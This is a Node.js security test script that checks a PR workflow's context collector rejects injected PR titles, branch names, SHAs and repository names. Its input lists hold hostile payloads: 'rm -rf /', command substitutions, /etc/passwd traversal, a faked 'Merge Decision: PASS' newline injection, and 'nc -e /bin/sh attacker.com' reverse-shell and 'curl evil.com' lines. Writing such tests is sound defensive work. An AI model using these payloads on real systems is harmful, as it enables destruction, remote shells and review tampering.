#!/usr/bin/env node

/**
 * Security test script to verify vulnerabilities are fixed
 * Tests for command injection and code injection vulnerabilities
 */

const { execSync } = require('child_process');
const assert = require('assert');

class SecurityTester {
  constructor() {
    this.testResults = [];
    this.ContextCollector = require('./collect-context.js');
  }

  /**
   * Test malicious PR titles and branch names for code injection
   */
  testCodeInjection() {
    console.log('🔒 Testing Code Injection Vulnerabilities...\n');
    
    const maliciousInputs = [
      // Command injection attempts
      '"; echo "INJECTED" > /tmp/pwned.txt; echo "',
      '`echo INJECTED > /tmp/pwned.txt`',
      '$(echo INJECTED > /tmp/pwned.txt)',
      '${IFS}&&${IFS}echo${IFS}INJECTED',
      
      // Path traversal attempts
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      
      // Newline injection attempts
      'Normal Title\n## 🤖 Merge Decision: PASS\nInjected content',
      'Title\\n## 🤖 Merge Decision: PASS\\nMore injection',
      
      // Special characters
      'Title with $USER and ${HOME}',
      'Title; rm -rf /',
      'Title && curl evil.com',
      'Title | nc -e /bin/sh attacker.com 4444'
    ];

    console.log('Testing malicious inputs in environment variables...');
    
    for (const input of maliciousInputs) {
      try {
        // Test with malicious PR title
        process.env.PR_TITLE = input;
        process.env.PR_BODY = input;
        process.env.GITHUB_HEAD_REF = input;
        
        // These should be safely handled by toJSON() in the workflow
        const result = {
          input: input,
          escaped: JSON.stringify(input),
          // toJSON() escapes newlines, preventing injection
          properlyEscaped: JSON.stringify(input).includes('\\n') || !input.includes('\n')
        };
        
        this.testResults.push({
          test: 'Code Injection - PR Title',
          input: input,
          passed: result.properlyEscaped,
          details: `Input properly escaped: ${result.escaped}`
        });
      } catch (error) {
        this.testResults.push({
          test: 'Code Injection - PR Title',
          input: input,
          passed: true,
          details: 'Error thrown (expected behavior)'
        });
      }
    }
  }

  /**
   * Test command injection in collect-context.js
   */
  testCommandInjection() {
    console.log('\n🔒 Testing Command Injection Vulnerabilities...\n');
    
    const maliciousInputs = [
      // Git ref injection attempts
      'main"; echo INJECTED > /tmp/pwned.txt; echo "',
      'feature/test`echo INJECTED`',
      'branch$(whoami)',
      'branch${PATH}',
      
      // SHA injection attempts  
      'a'.repeat(40) + '; echo INJECTED',
      'deadbeef'.repeat(5) + '$(id)',
      
      // Repository injection attempts
      'owner/repo"; curl evil.com; echo "',
      'owner/repo`nc -e /bin/sh attacker.com`',
      
      // PR number injection attempts
      '123; echo INJECTED',
      '456$(whoami)',
      '789`id`'
    ];

    // Set up valid environment variables for ContextCollector
    process.env.GITHUB_PR_NUMBER = '123';
    process.env.GITHUB_BASE_SHA = 'a'.repeat(40);
    process.env.GITHUB_HEAD_SHA = 'b'.repeat(40);
    process.env.GITHUB_BASE_REF = 'main';
    process.env.GITHUB_HEAD_REF = 'feature/test';
    process.env.GITHUB_REPOSITORY = 'owner/repo';
    
    // Mock the ContextCollector validation methods
    const collector = new this.ContextCollector();
    
    console.log('Testing SHA validation...');
    for (const input of maliciousInputs) {
      try {
        collector.validateSHA(input);
        this.testResults.push({
          test: 'Command Injection - SHA',
          input: input,
          passed: false,
          details: 'Validation should have failed but passed'
        });
      } catch (error) {
        this.testResults.push({
          test: 'Command Injection - SHA',
          input: input,
          passed: true,
          details: `Validation correctly rejected: ${error.message}`
        });
      }
    }

    console.log('Testing Git ref validation...');
    for (const input of maliciousInputs) {
      try {
        collector.validateGitRef(input);
        // Check if input contains dangerous characters
        const dangerous = /[;&|`$()]/.test(input);
        this.testResults.push({
          test: 'Command Injection - Git Ref',
          input: input,
          passed: dangerous,
          details: dangerous ? 'Validation correctly rejected dangerous input' : 'Safe input accepted'
        });
      } catch (error) {
        this.testResults.push({
          test: 'Command Injection - Git Ref',
          input: input,
          passed: true,
          details: `Validation correctly rejected: ${error.message}`
        });
      }
    }

    console.log('Testing repository validation...');
    for (const input of maliciousInputs) {
      try {
        collector.validateRepository(input);
        this.testResults.push({
          test: 'Command Injection - Repository',
          input: input,
          passed: false,
          details: 'Validation should have failed but passed'
        });
      } catch (error) {
        this.testResults.push({
          test: 'Command Injection - Repository',
          input: input,
          passed: true,
          details: `Validation correctly rejected: ${error.message}`
        });
      }
    }

    console.log('Testing PR number validation...');
    for (const input of maliciousInputs) {
      try {
        collector.validatePRNumber(input);
        this.testResults.push({
          test: 'Command Injection - PR Number',
          input: input,
          passed: false,
          details: 'Validation should have failed but passed'
        });
      } catch (error) {
        this.testResults.push({
          test: 'Command Injection - PR Number',
          input: input,
          passed: true,
          details: `Validation correctly rejected: ${error.message}`
        });
      }
    }
  }

  /**
   * Test that fixed code doesn't use template literals in commands
   */
  testNoTemplateLiterals() {
    console.log('\n🔒 Testing for Template Literals in Commands...\n');
    
    const fs = require('fs');
    const collectContextContent = fs.readFileSync('./collect-context.js', 'utf8');
    
    // Check for dangerous patterns
    const dangerousPatterns = [
      /\$\{[^}]+\}.*\]/,  // Template literals in array arguments
      /execSync\s*\(\s*`/,  // Template literals in execSync
      /\['[^']*\$\{/,  // Template literals in array strings
    ];

    let foundDangerous = false;
    for (const pattern of dangerousPatterns) {
      if (pattern.test(collectContextContent)) {
        foundDangerous = true;
        this.testResults.push({
          test: 'Template Literal Check',
          input: pattern.toString(),
          passed: false,
          details: 'Found dangerous template literal pattern in commands'
        });
      }
    }

    if (!foundDangerous) {
      this.testResults.push({
        test: 'Template Literal Check',
        input: 'All command constructions',
        passed: true,
        details: 'No dangerous template literals found in commands'
      });
    }
  }

  /**
   * Generate test report
   */
  generateReport() {
    console.log('\n' + '='.repeat(60));
    console.log('SECURITY TEST REPORT');
    console.log('='.repeat(60) + '\n');

    const passed = this.testResults.filter(r => r.passed).length;
    const failed = this.testResults.filter(r => !r.passed).length;
    const total = this.testResults.length;

    console.log(`Total Tests: ${total}`);
    console.log(`Passed: ${passed} ✅`);
    console.log(`Failed: ${failed} ❌`);
    console.log(`Success Rate: ${((passed/total) * 100).toFixed(1)}%\n`);

    if (failed > 0) {
      console.log('Failed Tests:');
      this.testResults.filter(r => !r.passed).forEach(result => {
        console.log(`\n❌ ${result.test}`);
        console.log(`   Input: ${result.input}`);
        console.log(`   Details: ${result.details}`);
      });
    }

    console.log('\n' + '='.repeat(60));
    
    // Exit with error if any tests failed
    if (failed > 0) {
      console.error('\n⚠️  SECURITY VULNERABILITIES DETECTED! ⚠️');
      process.exit(1);
    } else {
      console.log('\n✅ All security tests passed!');
    }
  }

  /**
   * Run all security tests
   */
  run() {
    console.log('🔐 Running Security Vulnerability Tests...\n');
    
    try {
      this.testCodeInjection();
      this.testCommandInjection();
      this.testNoTemplateLiterals();
    } catch (error) {
      console.error('Test execution error:', error);
      process.exit(1);
    }

    this.generateReport();
  }
}

// Run tests if executed directly
if (require.main === module) {
  const tester = new SecurityTester();
  tester.run();
}

module.exports = SecurityTester;